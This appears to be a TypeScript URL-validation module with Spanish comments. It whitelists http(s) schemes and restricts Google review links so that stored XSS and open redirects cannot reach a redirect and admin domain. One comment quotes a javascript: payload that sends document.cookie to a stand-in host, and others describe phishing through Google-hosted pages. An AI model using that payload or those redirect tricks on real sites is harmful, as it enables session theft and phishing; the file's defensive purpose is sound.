// Valida que una URL cargada por un humano (admin, cliente del portal, o
// comprador de una pieza autogestionada) sea segura antes de guardarla.
//
// Dos cosas distintas, las dos necesarias:
//
// 1. Que esté bien formada — evita que un typo quede pegado en un cartel
//    NFC/QR ya impreso hasta que alguien lo note.
//
// 2. Que el esquema sea http(s) — esto NO es cosmético. `new URL()` parsea
//    feliz "javascript:fetch('https://malo/'+document.cookie)", y ese valor
//    termina en `location.replace()` y en un <a href> dentro de
//    components/tap/RedireccionSuave.tsx. Sin este filtro, cualquiera que
//    pueda editar el destino de una pieza (el dueño de un cartel comprado en
//    Mercado Libre, con solo su PIN) logra ejecutar JavaScript en
//    app.metricsfield.com — el MISMO origen donde vive la cookie de sesión
//    de /admin. Es XSS almacenado con robo de sesión del panel.
//
// Por eso la lista es blanca (solo lo explícitamente permitido) y no negra:
// además de javascript:, deja afuera data:, vbscript:, file: y cualquier
// esquema raro que aparezca en el futuro.
const ESQUEMAS_PERMITIDOS = new Set(["http:", "https:"]);

export function urlSegura(url: string): string | null {
  const limpia = url.replace(/[\x00-\x1f\x7f]/g, "").trim();
  if (!limpia) return null;
  try {
    const parsed = new URL(limpia);
    if (!ESQUEMAS_PERMITIDOS.has(parsed.protocol)) return null;
    // Forma canónica "http(s)://": Node acepta también "https:\\host" o
    // "https:host", y otro parser podría leer otro host en ese texto.
    if (!/^https?:\/\/[^/\\]/i.test(limpia)) return null;
    return limpia;
  } catch {
    return null;
  }
}

// Link de reseña para una pieza autogestionada (comprada en Mercado Libre,
// sin cuenta ni contrato): solo puede llevar a Google. Sin este filtro,
// cualquiera que compre una pieza puede convertir
// app.metricsfield.com/t/<id> en un redireccionador hacia el sitio que
// quiera (phishing con nuestro dominio adelante) y, si Google Safe Browsing
// lo detecta, marca el dominio entero: dejan de andar TODOS los carteles.
// Los clientes de la agencia (portal, admin) siguen pudiendo poner
// cualquier destino con urlSegura — son cuentas conocidas.
// Lista por host EXACTO y, donde hace falta, por comienzo de ruta. No alcanza
// con "cualquier subdominio de google.com": sites.google.com, docs.google.com
// y script.google.com alojan páginas que arma cualquiera (un formulario que
// pide la clave del banco), y google.com/url y google.com/amp redirigen a
// sitios de afuera. Con eso, una pieza comprada servía de phishing con
// nuestro dominio adelante.
const GOOGLE_PRINCIPAL = ["google.com", "www.google.com", "google.com.ar", "www.google.com.ar"];
const DESTINOS_RESENA_GOOGLE: { hosts: string[]; rutas?: string[] }[] = [
  { hosts: ["g.page", "maps.app.goo.gl"] },
  { hosts: ["goo.gl"], rutas: ["/maps/"] },
  { hosts: ["search.google.com"], rutas: ["/local/"] },
  { hosts: ["maps.google.com", "maps.google.com.ar"] },
  { hosts: GOOGLE_PRINCIPAL, rutas: ["/maps", "/search", "/local/"] },
];

function rutaEmpiezaCon(pathname: string, prefijo: string): boolean {
  if (prefijo.endsWith("/")) return pathname.startsWith(prefijo);
  return pathname === prefijo || pathname.startsWith(`${prefijo}/`);
}

export function urlResenaGoogle(url: string): string | null {
  const limpia = urlSegura(url);
  if (!limpia) return null;
  const { protocol, hostname, username, password, pathname, port } = new URL(limpia);
  if (protocol !== "https:" || username || password || port) return null;
  const host = hostname.toLowerCase().replace(/\.$/, "");
  const ok = DESTINOS_RESENA_GOOGLE.some(
    (d) => d.hosts.includes(host) && (!d.rutas || d.rutas.some((r) => rutaEmpiezaCon(pathname, r))),
  );
  return ok ? limpia : null;
}
